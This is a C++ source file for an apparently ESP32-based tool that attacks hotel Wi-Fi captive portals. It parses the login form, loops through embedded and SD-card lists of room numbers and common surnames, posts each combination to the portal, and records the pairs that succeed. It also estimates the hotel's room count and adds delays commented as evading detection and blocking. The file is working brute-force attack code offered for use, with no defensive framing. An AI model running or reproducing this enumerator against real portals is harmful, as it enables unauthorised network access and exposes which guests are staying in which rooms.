#include "enumerator.h"
#include "config.h"
#include <HTTPClient.h>
#include <SPIFFS.h>
#include <SD.h>

// Static member initialization
std::vector<String> Enumerator::roomNumbers;
std::vector<String> Enumerator::surnames;
std::vector<String> Enumerator::customRooms;
std::vector<String> Enumerator::customSurnames;
Enumerator::ProgressCallback Enumerator::progressCb = nullptr;

// Field detection keywords
const char* roomKeywords[] = {"room", "zimmer", "chambre", "habitacion", "number", "num", "rm"};
const char* lastNameKeywords[] = {"last", "surname", "family", "nachname", "apellido", "nom"};
const char* firstNameKeywords[] = {"first", "given", "vorname", "nombre", "prenom"};
const char* emailKeywords[] = {"email", "mail", "correo"};
const char* phoneKeywords[] = {"phone", "tel", "mobile", "cell", "telefon"};
const char* codeKeywords[] = {"code", "access", "pin", "password", "pwd", "pass"};

void Enumerator::init() {
    // Initialize SPIFFS for wordlist storage
    if (!SPIFFS.begin(true)) {
        #if DEBUG_SERIAL
        Serial.println("[ENUM] SPIFFS mount failed");
        #endif
    }

    // Load wordlists
    roomNumbers = loadRoomNumbers();
    surnames = loadSurnames();

    #if DEBUG_SERIAL
    Serial.printf("[ENUM] Loaded %d room numbers, %d surnames\n",
        roomNumbers.size(), surnames.size());
    #endif
}

std::vector<String> Enumerator::loadRoomNumbers() {
    std::vector<String> rooms;

    // Default embedded list (subset for memory efficiency)
    const char* defaultRooms[] = {
        // Floor 1
        "101", "102", "103", "104", "105", "106", "107", "108", "109", "110",
        "111", "112", "113", "114", "115", "116", "117", "118", "119", "120",
        // Floor 2
        "201", "202", "203", "204", "205", "206", "207", "208", "209", "210",
        "211", "212", "213", "214", "215", "216", "217", "218", "219", "220",
        // Floor 3
        "301", "302", "303", "304", "305", "306", "307", "308", "309", "310",
        "311", "312", "313", "314", "315", "316", "317", "318", "319", "320",
        // Floor 4
        "401", "402", "403", "404", "405", "406", "407", "408", "409", "410",
        // Floor 5
        "501", "502", "503", "504", "505", "506", "507", "508", "509", "510",
        // Higher floors (common in larger hotels)
        "601", "602", "603", "701", "702", "703", "801", "802", "803",
        "901", "902", "903", "1001", "1002", "1003", "1101", "1102", "1103",
        // Simple numbers
        "1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
        // Letter prefixes
        "A1", "A2", "A3", "B1", "B2", "B3", "C1", "C2", "C3"
    };

    for (const char* room : defaultRooms) {
        rooms.push_back(String(room));
    }

    // Try to load extended list from SD card
    #if USE_SD_CARD_IF_AVAILABLE
    if (SD.exists("/wordlists/room_numbers.txt")) {
        File f = SD.open("/wordlists/room_numbers.txt", FILE_READ);
        while (f.available()) {
            String line = f.readStringUntil('\n');
            line.trim();
            if (line.length() > 0 && line[0] != '#') {
                rooms.push_back(line);
            }
        }
        f.close();
    }
    #endif

    return rooms;
}

std::vector<String> Enumerator::loadSurnames() {
    std::vector<String> names;

    // Default embedded list (top surnames)
    const char* defaultNames[] = {
        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
        "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
        "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
        "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
        "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
        "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
        "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
        "Carter", "Roberts", "Patel", "Kim", "Murphy", "Chen", "Wang", "Li",
        "Guest", "Test", "Demo", "Admin"
    };

    for (const char* name : defaultNames) {
        names.push_back(String(name));
    }

    // Try to load extended list from SD card
    #if USE_SD_CARD_IF_AVAILABLE
    if (SD.exists("/wordlists/surnames.txt")) {
        File f = SD.open("/wordlists/surnames.txt", FILE_READ);
        while (f.available()) {
            String line = f.readStringUntil('\n');
            line.trim();
            if (line.length() > 0 && line[0] != '#') {
                names.push_back(line);
            }
        }
        f.close();
    }
    #endif

    return names;
}

std::vector<FormField> Enumerator::analyzePortalForm(const String& html) {
    std::vector<FormField> fields = extractFormFields(html);

    // Detect field types
    for (auto& field : fields) {
        field.detectedType = detectFieldType(field);
    }

    #if DEBUG_SERIAL && DEBUG_PORTAL
    Serial.printf("[ENUM] Analyzed form: %d fields\n", fields.size());
    for (const auto& field : fields) {
        Serial.printf("  - %s (%s) -> Type: %d\n",
            field.name.c_str(), field.type.c_str(), field.detectedType);
    }
    #endif

    return fields;
}

FieldType Enumerator::detectFieldType(const FormField& field) {
    String combined = field.name + " " + field.id + " " + field.placeholder;
    combined.toLowerCase();

    // Check for room number
    for (const char* kw : roomKeywords) {
        if (combined.indexOf(kw) >= 0) {
            return FIELD_ROOM_NUMBER;
        }
    }

    // Check for last name
    for (const char* kw : lastNameKeywords) {
        if (combined.indexOf(kw) >= 0) {
            return FIELD_LAST_NAME;
        }
    }

    // Check for first name
    for (const char* kw : firstNameKeywords) {
        if (combined.indexOf(kw) >= 0) {
            return FIELD_FIRST_NAME;
        }
    }

    // Check for email
    for (const char* kw : emailKeywords) {
        if (combined.indexOf(kw) >= 0) {
            return FIELD_EMAIL;
        }
    }

    // Check for phone
    for (const char* kw : phoneKeywords) {
        if (combined.indexOf(kw) >= 0) {
            return FIELD_PHONE;
        }
    }

    // Check for code/password
    for (const char* kw : codeKeywords) {
        if (combined.indexOf(kw) >= 0) {
            return FIELD_CODE;
        }
    }

    // Check for checkbox
    if (field.type == "checkbox") {
        return FIELD_CHECKBOX;
    }

    // Check for submit button
    if (field.type == "submit" || field.type == "button") {
        return FIELD_BUTTON;
    }

    return FIELD_UNKNOWN;
}

std::vector<FormField> Enumerator::extractFormFields(const String& html) {
    std::vector<FormField> fields;

    // Simple HTML parser for input fields
    int searchStart = 0;
    while (true) {
        int inputStart = html.indexOf("<input", searchStart);
        if (inputStart < 0) break;

        int inputEnd = html.indexOf(">", inputStart);
        if (inputEnd < 0) break;

        String inputTag = html.substring(inputStart, inputEnd + 1);
        inputTag.toLowerCase();

        FormField field;

        // Extract name attribute
        int nameStart = inputTag.indexOf("name=\"");
        if (nameStart >= 0) {
            nameStart += 6;
            int nameEnd = inputTag.indexOf("\"", nameStart);
            if (nameEnd > nameStart) {
                field.name = inputTag.substring(nameStart, nameEnd);
            }
        }

        // Extract id attribute
        int idStart = inputTag.indexOf("id=\"");
        if (idStart >= 0) {
            idStart += 4;
            int idEnd = inputTag.indexOf("\"", idStart);
            if (idEnd > idStart) {
                field.id = inputTag.substring(idStart, idEnd);
            }
        }

        // Extract type attribute
        int typeStart = inputTag.indexOf("type=\"");
        if (typeStart >= 0) {
            typeStart += 6;
            int typeEnd = inputTag.indexOf("\"", typeStart);
            if (typeEnd > typeStart) {
                field.type = inputTag.substring(typeStart, typeEnd);
            }
        } else {
            field.type = "text";  // Default
        }

        // Extract placeholder
        int phStart = inputTag.indexOf("placeholder=\"");
        if (phStart >= 0) {
            phStart += 13;
            int phEnd = inputTag.indexOf("\"", phStart);
            if (phEnd > phStart) {
                field.placeholder = inputTag.substring(phStart, phEnd);
            }
        }

        // Check required
        field.required = inputTag.indexOf("required") >= 0;

        // Add if it has a name
        if (field.name.length() > 0) {
            fields.push_back(field);
        }

        searchStart = inputEnd;
    }

    return fields;
}

String Enumerator::extractFormAction(const String& html) {
    int formStart = html.indexOf("<form");
    if (formStart < 0) return "";

    int formEnd = html.indexOf(">", formStart);
    String formTag = html.substring(formStart, formEnd);

    int actionStart = formTag.indexOf("action=\"");
    if (actionStart >= 0) {
        actionStart += 8;
        int actionEnd = formTag.indexOf("\"", actionStart);
        if (actionEnd > actionStart) {
            return formTag.substring(actionStart, actionEnd);
        }
    }

    return "";
}

String Enumerator::extractFormMethod(const String& html) {
    int formStart = html.indexOf("<form");
    if (formStart < 0) return "POST";

    int formEnd = html.indexOf(">", formStart);
    String formTag = html.substring(formStart, formEnd);
    formTag.toLowerCase();

    if (formTag.indexOf("method=\"get\"") >= 0) {
        return "GET";
    }

    return "POST";  // Default
}

EnumResult Enumerator::enumerate(NetworkInfo* portal, int maxAttempts) {
    EnumResult result;
    result.totalAttempts = 0;
    result.successfulAttempts = 0;
    result.failedAttempts = 0;

    if (!portal || portal->portalHtml.length() == 0) {
        #if DEBUG_SERIAL
        Serial.println("[ENUM] No portal HTML to analyze");
        #endif
        return result;
    }

    // Analyze the form
    std::vector<FormField> fields = analyzePortalForm(portal->portalHtml);

    // Find room and name fields
    FormField* roomField = nullptr;
    FormField* nameField = nullptr;

    for (auto& field : fields) {
        if (field.detectedType == FIELD_ROOM_NUMBER && !roomField) {
            roomField = &field;
        }
        if (field.detectedType == FIELD_LAST_NAME && !nameField) {
            nameField = &field;
        }
    }

    if (!roomField && !nameField) {
        #if DEBUG_SERIAL
        Serial.println("[ENUM] No enumerable fields found");
        #endif
        result.venueInsights = "Portal does not use room/name authentication";
        return result;
    }

    // Get form submission URL
    String formAction = extractFormAction(portal->portalHtml);
    if (formAction.length() == 0) {
        formAction = portal->portalUrl;
    } else if (!formAction.startsWith("http")) {
        // Relative URL - make absolute
        int slashPos = portal->portalUrl.lastIndexOf('/');
        if (slashPos > 8) {  // After http://
            formAction = portal->portalUrl.substring(0, slashPos + 1) + formAction;
        }
    }

    #if DEBUG_SERIAL
    Serial.printf("[ENUM] Starting enumeration on %s\n", formAction.c_str());
    Serial.printf("[ENUM] Room field: %s, Name field: %s\n",
        roomField ? roomField->name.c_str() : "none",
        nameField ? nameField->name.c_str() : "none");
    #endif

    // Determine enumeration strategy
    int attemptCount = 0;
    int successCount = 0;

    // If we have both room and name, try combinations
    if (roomField && nameField) {
        // Try common surname with room number enumeration
        for (const String& room : roomNumbers) {
            if (attemptCount >= maxAttempts) break;

            // Try with a few common surnames
            for (int i = 0; i < min(5, (int)surnames.size()); i++) {
                if (attemptCount >= maxAttempts) break;

                if (progressCb) {
                    progressCb(attemptCount, maxAttempts,
                        "Room " + room + " / " + surnames[i]);
                }

                bool success = testCredentials(formAction, fields, room, surnames[i]);
                attemptCount++;
                result.totalAttempts++;

                if (success) {
                    successCount++;
                    result.successfulAttempts++;

                    EnumAttempt attempt;
                    attempt.fieldValues = "{\"room\":\"" + room + "\",\"name\":\"" + surnames[i] + "\"}";
                    attempt.success = true;
                    attempt.timestamp = millis();
                    result.successes.push_back(attempt);

                    // Track patterns
                    result.discoveredPatterns.push_back("Room: " + room);
                }

                // Rate limiting to avoid detection/blocking
                delay(500);
            }
        }
    }
    // If only room number
    else if (roomField) {
        for (const String& room : roomNumbers) {
            if (attemptCount >= maxAttempts) break;

            if (progressCb) {
                progressCb(attemptCount, maxAttempts, "Testing room " + room);
            }

            bool success = testCredentials(formAction, fields, room, "");
            attemptCount++;
            result.totalAttempts++;

            if (success) {
                successCount++;
                result.successfulAttempts++;
                result.discoveredPatterns.push_back("Room: " + room);
            }

            delay(300);
        }
    }
    // If only name
    else if (nameField) {
        for (const String& name : surnames) {
            if (attemptCount >= maxAttempts) break;

            if (progressCb) {
                progressCb(attemptCount, maxAttempts, "Testing name " + name);
            }

            bool success = testCredentials(formAction, fields, "", name);
            attemptCount++;
            result.totalAttempts++;

            if (success) {
                successCount++;
                result.successfulAttempts++;
                result.discoveredPatterns.push_back("Name: " + name);
            }

            delay(300);
        }
    }

    // Generate insights
    if (successCount > 0) {
        // Estimate room count from highest successful room number
        int maxRoom = 0;
        for (const String& pattern : result.discoveredPatterns) {
            if (pattern.startsWith("Room: ")) {
                int room = pattern.substring(6).toInt();
                if (room > maxRoom) maxRoom = room;
            }
        }

        if (maxRoom > 0) {
            // Estimate based on room number format
            if (maxRoom >= 1000) {
                result.estimatedRoomCount = String((maxRoom / 100) * 10) + "+ rooms (est)";
            } else if (maxRoom >= 100) {
                int floors = maxRoom / 100;
                result.estimatedRoomCount = String(floors) + " floors, ~" +
                    String(floors * 15) + " rooms (est)";
            } else {
                result.estimatedRoomCount = String(maxRoom) + "+ rooms";
            }
        }

        result.venueInsights = "Portal accepts room/name auth. " +
            String(successCount) + " valid combinations found. " +
            result.estimatedRoomCount;
    } else {
        result.venueInsights = "No valid credentials found in " +
            String(attemptCount) + " attempts";
    }

    result.failedAttempts = attemptCount - successCount;

    #if DEBUG_SERIAL
    Serial.printf("[ENUM] Complete: %d attempts, %d successes\n",
        attemptCount, successCount);
    Serial.printf("[ENUM] Insight: %s\n", result.venueInsights.c_str());
    #endif

    return result;
}

bool Enumerator::testCredentials(const String& url,
                                 const std::vector<FormField>& fields,
                                 const String& roomNumber,
                                 const String& lastName) {
    HTTPClient http;
    WiFiClient client;

    String postData = buildPostData(fields, roomNumber, lastName);

    http.begin(client, url);
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");
    http.setTimeout(PORTAL_CHECK_TIMEOUT);

    int httpCode = http.POST(postData);
    String response = http.getString();

    http.end();

    return isSuccessResponse(httpCode, response);
}

String Enumerator::buildPostData(const std::vector<FormField>& fields,
                                 const String& roomNumber,
                                 const String& lastName) {
    String data = "";

    for (const auto& field : fields) {
        if (data.length() > 0) data += "&";

        data += field.name + "=";

        switch (field.detectedType) {
            case FIELD_ROOM_NUMBER:
                data += roomNumber;
                break;
            case FIELD_LAST_NAME:
                data += lastName;
                break;
            case FIELD_FIRST_NAME:
                data += "Guest";  // Default first name
                break;
            case FIELD_CHECKBOX:
                data += "on";  // Accept terms, etc.
                break;
            default:
                // Leave empty or use placeholder
                break;
        }
    }

    return data;
}

bool Enumerator::isSuccessResponse(int httpCode, const String& response) {
    // Success indicators
    if (httpCode == 200 || httpCode == 302) {
        String lower = response;
        lower.toLowerCase();

        // Check for success indicators
        if (lower.indexOf("success") >= 0 ||
            lower.indexOf("welcome") >= 0 ||
            lower.indexOf("connected") >= 0 ||
            lower.indexOf("authenticated") >= 0 ||
            lower.indexOf("thank you") >= 0) {
            return true;
        }

        // Check for failure indicators (return false if found)
        if (lower.indexOf("invalid") >= 0 ||
            lower.indexOf("error") >= 0 ||
            lower.indexOf("incorrect") >= 0 ||
            lower.indexOf("failed") >= 0 ||
            lower.indexOf("wrong") >= 0 ||
            lower.indexOf("not found") >= 0) {
            return false;
        }

        // 302 redirect often means success
        if (httpCode == 302) {
            return true;
        }
    }

    return false;
}

void Enumerator::addCustomRoom(const String& room) {
    customRooms.push_back(room);
    roomNumbers.push_back(room);
}

void Enumerator::addCustomSurname(const String& surname) {
    customSurnames.push_back(surname);
    surnames.push_back(surname);
}

void Enumerator::setProgressCallback(ProgressCallback cb) {
    progressCb = cb;
}
